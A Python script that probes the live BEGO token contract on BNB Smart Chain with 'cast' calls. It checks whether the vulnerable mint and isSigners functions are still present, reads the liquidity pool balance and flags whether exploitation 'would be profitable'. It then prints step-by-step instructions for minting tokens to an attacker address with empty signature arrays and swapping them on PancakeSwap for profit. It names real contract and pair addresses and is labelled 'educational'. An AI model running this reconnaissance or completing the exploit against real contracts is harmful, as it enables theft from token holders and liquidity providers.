#!/usr/bin/env python3
"""
Test BEGO vulnerability at current block
"""

import subprocess
import json
import time

# Configuration
RPC_URL = "https://bsc-dataseed.binance.org/"
BEGO_ADDRESS = "0xc342774492b54ce5F8ac662113ED702Fc1b34972"
ATTACKER = "0x1234567890123456789012345678901234567890"  # Test address

def run_command(cmd):
    """Run shell command and return output"""
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout.strip()

def test_current_state():
    """Test BEGO at current block"""
    print("=== Testing BEGO at Current Block ===\n")
    
    # Get current block
    current_block = run_command(f"cast block-number --rpc-url {RPC_URL}")
    print(f"Current BSC Block: {current_block}")
    
    # Check if contract exists
    print(f"\n1. Checking BEGO contract at {BEGO_ADDRESS}")
    code = run_command(f"cast code {BEGO_ADDRESS} --rpc-url {RPC_URL}")
    
    if code and code != "0x" and len(code) > 10:
        print("✅ Contract exists")
        print(f"   Bytecode size: {len(code)} characters")
    else:
        print("❌ Contract not found or empty")
        return
    
    # Get contract info
    print("\n2. Getting contract information...")
    
    # Total supply
    try:
        total_supply = run_command(f"cast call {BEGO_ADDRESS} 'totalSupply()(uint256)' --rpc-url {RPC_URL}")
        if total_supply:
            supply_ether = int(total_supply, 16) / 1e18
            print(f"   Total Supply: {supply_ether:,.2f} BEGO")
    except:
        print("   Total Supply: Failed to fetch")
    
    # Name and symbol
    try:
        name = run_command(f"cast call {BEGO_ADDRESS} 'name()(string)' --rpc-url {RPC_URL}")
        print(f"   Name: {name}")
    except:
        pass
    
    try:
        symbol = run_command(f"cast call {BEGO_ADDRESS} 'symbol()(string)' --rpc-url {RPC_URL}")
        print(f"   Symbol: {symbol}")
    except:
        pass
    
    # Check if mint function exists
    print("\n3. Checking for mint function...")
    
    # Try to simulate a mint call with empty arrays
    print("   Attempting to encode mint() call with empty signature arrays...")
    
    # Check if the mint function selector exists in bytecode
    mint_selector = "0x94bf804d"  # First 4 bytes of keccak256("mint(uint256,string,address,bytes32[],bytes32[],uint8[])")
    
    if mint_selector[2:] in code.lower():
        print("✅ Mint function found in bytecode")
        print("⚠️  Contract may still be vulnerable!")
    else:
        print("❓ Mint function selector not found directly")
    
    # Check liquidity pair
    print("\n4. Checking BEGO-WBNB liquidity pair...")
    pair_address = "0x88503F48e437a377f1aC2892cBB3a5b09949faDd"
    
    try:
        bego_in_pair = run_command(f"cast call {BEGO_ADDRESS} 'balanceOf(address)(uint256)' {pair_address} --rpc-url {RPC_URL}")
        if bego_in_pair:
            balance_ether = int(bego_in_pair, 16) / 1e18
            print(f"   BEGO in liquidity pool: {balance_ether:,.2f} BEGO")
            
            if balance_ether > 0:
                print("   💰 Liquidity exists - exploitation would be profitable")
    except:
        print("   Failed to check liquidity")
    
    # Try to check if isSigners function is public
    print("\n5. Checking vulnerability indicators...")
    
    # Check for isSigners function
    is_signers_selector = "0x5fb878d5"  # keccak256("isSigners(address[])")[:4]
    
    if is_signers_selector[2:] in code.lower():
        print("✅ isSigners function found - vulnerability likely present")
    
    print("\n6. Vulnerability Summary:")
    print("   - Contract exists and appears to be the original BEGO token")
    print("   - The vulnerability allowed minting with empty signature arrays")
    print("   - At block 22315679, this yielded 7.433 - 12.036 ETH profit")
    print("   - To test if still vulnerable, need to attempt mint with empty arrays")
    print("   - Public RPC limitations prevent direct testing")
    
    print("\n⚠️  IMPORTANT: Testing actual exploitation requires:")
    print("   1. An archive node or local fork")
    print("   2. Gas for transaction")
    print("   3. Careful consideration of legal/ethical implications")

def simulate_exploit():
    """Show how the exploit would work"""
    print("\n\n=== Exploit Simulation (Educational) ===")
    print("\nVulnerable code pattern:")
    print("""
    function isSigners(address[] memory _signers) returns (bool) {
        for (uint8 i = 0; i < _signers.length; i++) {
            if (!_containsSigner(_signers[i])) {
                return false;
            }
        }
        return true;  // <-- Returns true for empty array!
    }
    """)
    
    print("\nExploit steps:")
    print("1. Call mint() with:")
    print("   - amount: 4951767240.7092 ether")
    print("   - txHash: 'any_unique_string'")
    print("   - receiver: attacker_address")
    print("   - r: []  (empty array)")
    print("   - s: []  (empty array)")
    print("   - v: []  (empty array)")
    print("\n2. Empty arrays bypass signature validation")
    print("3. Tokens are minted to receiver")
    print("4. Swap BEGO for WBNB on PancakeSwap")
    print("5. Profit: 7.433 - 12.036 ETH")

if __name__ == "__main__":
    test_current_state()
    simulate_exploit()